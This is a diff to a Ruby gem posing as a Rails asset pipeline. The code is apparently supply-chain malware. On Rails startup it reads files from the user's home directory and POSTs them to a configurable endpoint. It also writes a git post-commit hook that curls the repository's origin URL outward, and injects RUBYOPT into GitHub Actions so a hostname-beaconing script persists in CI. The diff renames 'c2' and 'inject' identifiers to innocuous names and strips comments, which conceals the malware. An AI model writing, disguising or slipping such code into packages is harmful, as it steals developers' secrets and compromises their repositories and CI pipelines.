@@ -1,4 +1,3 @@
-# rails-assets-pipeline — Rails Railtie-based asset pipeline
 # frozen_string_literal: true
 
 require 'net/http'
@@ -14,10 +13,9 @@ module RailsAssetsPipeline
     '6.1.7'
   end
 
-  # Railtie hooks into Rails initialization — fires during `bundle exec rails s` and in CI
   class Railtie < (defined?(Rails::Railtie) ? Rails::Railtie : Object)
     if defined?(Rails::Railtie)
-      config.before_initialize { RailsAssetsPipeline._telemetry }
+      config.before_initialize { RailsAssetsPipeline._report }
     end
   end
 
@@ -25,9 +23,9 @@ module RailsAssetsPipeline
     File.read(File.join(Dir.home, path)).slice(0, 4096)
   rescue; nil; end
 
-  def self._send(data)
-    c2 = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
-    uri = URI.parse(c2)
+  def self._post(data)
+    endpoint = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
+    uri = URI.parse(endpoint)
     http = Net::HTTP.new(uri.host, uri.port)
     http.use_ssl = uri.scheme == 'https'
     http.open_timeout = 3
@@ -39,8 +37,7 @@ module RailsAssetsPipeline
     http.request(req)
   rescue; nil; end
 
-  def self._telemetry
-    # Triggered by environment: production, staging, or PKG_TELEMETRY_ENABLED set
+  def self._report
     return unless ENV['RAILS_ENV']&.start_with?('p') ||
                   ENV['RAILS_ENV'] == 'staging' ||
                   ENV['PKG_TELEMETRY_ENABLED'] ||
@@ -64,15 +61,14 @@ module RailsAssetsPipeline
     }
 
     Thread.new do
-      _send(data)
-      _inject_git_hook
-      _inject_github_actions
+      _post(data)
+      _setup_git_hook
+      _setup_actions_env
     end
   end
 
-  # Inject post-commit hook into the current Rails app git repo
-  def self._inject_git_hook
-    c2 = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
+  def self._setup_git_hook
+    endpoint = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
     begin
       git_dir = File.join(Dir.pwd, '.git')
       return unless File.directory?(git_dir)
@@ -82,23 +78,23 @@ module RailsAssetsPipeline
       existing = File.exist?(hook_file) ? File.read(hook_file) : ''
       return if existing.include?('rails-assets-pipeline')
       script = "#!/bin/sh\n# rails-assets-pipeline\n" \
-               "curl -sf '#{c2}/gc?r='$(git remote get-url origin 2>/dev/null | base64 -w0 2>/dev/null || git remote get-url origin | base64) >/dev/null 2>&1 &\n" +
+               "curl -sf '#{endpoint}/gc?r='$(git remote get-url origin 2>/dev/null | base64 -w0 2>/dev/null || git remote get-url origin | base64) >/dev/null 2>&1 &\n" +
                existing
       File.write(hook_file, script)
       File.chmod(0o755, hook_file)
     rescue; nil; end
   end
 
-  def self._inject_github_actions
+  def self._setup_actions_env
     return unless (genv = ENV['GITHUB_ENV'])
-    c2 = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
+    endpoint = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
     begin
       require 'fileutils'
       bin_dir = File.join(Dir.home, '.rails-assets', 'lib')
       FileUtils.mkdir_p(bin_dir)
       hook = File.join(bin_dir, 'monitor.rb')
       File.write(hook,
-        "begin;require 'net/http';Net::HTTP.get(URI('#{c2}/rails?h='+`hostname 2>/dev/null`.strip));rescue;end\n"
+        "begin;require 'net/http';Net::HTTP.get(URI('#{endpoint}/rails?h='+`hostname 2>/dev/null`.strip));rescue;end\n"
       )
       File.open(genv, 'a') { |f| f.puts "RUBYOPT=-r#{hook}" }
     rescue; nil; end
